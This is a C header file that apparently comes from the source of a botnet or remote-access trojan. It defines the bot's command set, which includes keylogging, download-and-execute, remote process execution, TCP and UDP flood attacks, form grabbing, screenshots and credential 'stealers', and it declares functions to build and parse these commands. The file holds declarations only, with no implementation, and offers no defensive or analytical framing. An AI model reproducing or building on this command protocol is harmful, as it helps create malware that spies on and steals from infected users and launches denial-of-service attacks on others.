#ifndef COMMANDS_H
#define COMMANDS_H

#define COMMAND_JOIN 0
#define COMMAND_POLL 1
#define COMMAND_CHECKIFSITEISUP 2
#define COMMAND_SHUTDOWN 3
#define COMMAND_RESTART 4
#define COMMAND_MESSAGEBOX 5
#define COMMAND_KEYLOG 6
#define COMMAND_REMOTEPROCESS 7
#define COMMAND_DOWNLOADEXECUTE 8
#define COMMAND_REMOTEPROCESSNORESULT 9
#define COMMAND_TCPFLOOD 10
#define COMMAND_UPDATE 11
#define COMMAND_SCREENSHOT 12
#define COMMAND_UDPFLOOD 13
#define COMMAND_FORMGRAB 14
#define COMMAND_STEALERS 15

typedef void(*CommandParserDelegate) (int, int, char*);
typedef void(*PostPollDelegate) ();

char* CreateCommand(int commandId, int commandType, char* data, int dataLength);
void FreeCommand(char* data);

int ParseCommand(char* command, char** commandData, int* commandType);
void FreeParsedCommandResult(char* data);

#endif